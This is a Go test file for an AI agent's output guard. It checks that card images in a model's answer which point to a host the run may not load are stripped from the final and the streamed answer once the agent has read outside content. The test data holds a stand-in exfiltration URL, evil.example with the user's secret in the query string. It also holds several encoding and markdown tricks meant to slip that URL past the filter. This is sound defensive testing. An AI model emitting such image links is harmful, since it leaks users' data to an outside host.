package agents

import (
	"context"
	"strings"
	"testing"

	"leaflet/internal/doc"
)

const (
	keptPicture = "https://pics.example/harbour.png"
	evilPicture = "https://evil.example/p.png?d=the-user's-secret"
)

// pictured is a page with a card of keptPicture, which the run may load.
func pictured() *doc.Content {
	c := page()
	card, _ := doc.CardNodeFromJSON(`{"title": "Harbour", "image": "` + keptPicture + `", "facts": [{"label": "Open", "value": "9–5"}]}`)
	c.Children = append(c.Children, card)
	return c
}

// shownPictures is the pictures of the cards md shows, as each of the app's
// views finds them.
func shownPictures(t *testing.T, md string) map[string]bool {
	t.Helper()
	x := executor(page())
	x.armed = true
	x.begin()
	return x.refusedPictures(md)
}

// An answer of a run whose URL guard is on shows no card's picture the run
// may not load: the app loads a card's picture by itself.
func TestAnswerCardsLoadOnlyWhatTheRunMay(t *testing.T) {
	card := func(image string) string {
		return `{"title": "x", "image": "` + image + `", "facts": [{"label": "a", "value": "b"}]}`
	}
	answers := map[string]string{
		"fence":            "Here:\n\n```card\n" + card(evilPicture) + "\n```\n",
		"tildes":           "~~~card\n" + card(evilPicture) + "\n~~~\n",
		"quoted":           "> ```card\n> " + card(evilPicture) + "\n> ```\n",
		"in a list":        "- one\n\n  ```card\n  " + card(evilPicture) + "\n  ```\n",
		"after a summary":  "<details><summary>More</summary>```card\n" + card(evilPicture) + "\n```\n</details>\n",
		"escaped":          "```card\n" + card(`https:\/\/evil.example\/p.png?d=x`) + "\n```\n",
		"in unicode":       "```card\n" + card(`\u0068ttps://evil.example/p.png?d=x`) + "\n```\n",
		"spaced":           "```card\n" + card(`  `+evilPicture+` `) + "\n```\n",
		"still coming":     "```card\n" + card(evilPicture),
		"named in an info": "```&#99;ard\n" + card(evilPicture) + "\n```\n",
		"twice":            "```card\n{\"title\": \"x\", \"image\": \"" + keptPicture + "\", \"image\": \"" + evilPicture + "\"}\n```\n",
	}
	for name, answer := range answers {
		if len(shownPictures(t, answer)) == 0 && name != "named in an info" {
			t.Fatalf("%s: the test's answer shows no card of the picture", name)
		}
		for _, guard := range []string{"read another page", "read the web"} {
			x := executor(pictured())
			if guard == "read another page" {
				x.armed = true
			} else {
				x.saw()
			}
			x.begin()
			got := x.Answer(answer)
			if left := x.refusedPictures(got); len(left) > 0 {
				t.Errorf("%s, after it %s: the answer still shows %v:\n%s", name, guard, left, got)
			}
			if streamed := x.streamedAnswer()(answer); len(x.refusedPictures(streamed)) > 0 {
				t.Errorf("%s, after it %s: the answer streams in as %s", name, guard, streamed)
			}
		}
	}
	x := executor(pictured())
	x.armed = true
	x.begin()
	kept := "```card\n" + card(keptPicture) + "\n```\n\nAnd a picture the page has."
	if got := x.Answer(kept); got != kept {
		t.Errorf("a card of the page's picture became %q", got)
	}
	if got := executor(pictured()).Answer(answers["fence"]); got != answers["fence"] {
		t.Errorf("a run that read nothing beyond its page answered %q", got)
	}
}

// The answer streams in without the picture, and is kept so.
func TestStreamedAnswerCardsLoadOnlyWhatTheRunMay(t *testing.T) {
	answer := "Found it:\n\n```card\n{\"title\": \"x\", \"image\": \"" + evilPicture + "\"}\n```\n"
	model := &scriptedStream{turns: []ChatResult{{Content: answer}}}
	var shown []string
	x := executor(pictured())
	res, err := RunLocal(context.Background(), model, Request{Model: "m", SupportsTools: true, Instruction: "go",
		History: []Turn{{Role: "user", Content: "Look it up"}, {Role: "assistant", Content: "Done.", KeptToPage: true, Guarded: true}}, KeptToPage: true},
		x.Ctx, Events{Text: func(s string) { shown = append(shown, s) }})
	if err != nil {
		t.Fatal(err)
	}
	if len(shown) == 0 {
		t.Fatal("nothing streamed")
	}
	for _, s := range append(shown, res.Reply) {
		if strings.Contains(s, "evil.example") {
			t.Errorf("the answer showed as %q", s)
		}
	}
	if !strings.Contains(res.Reply, "```card") {
		t.Errorf("the card went: %q", res.Reply)
	}
}
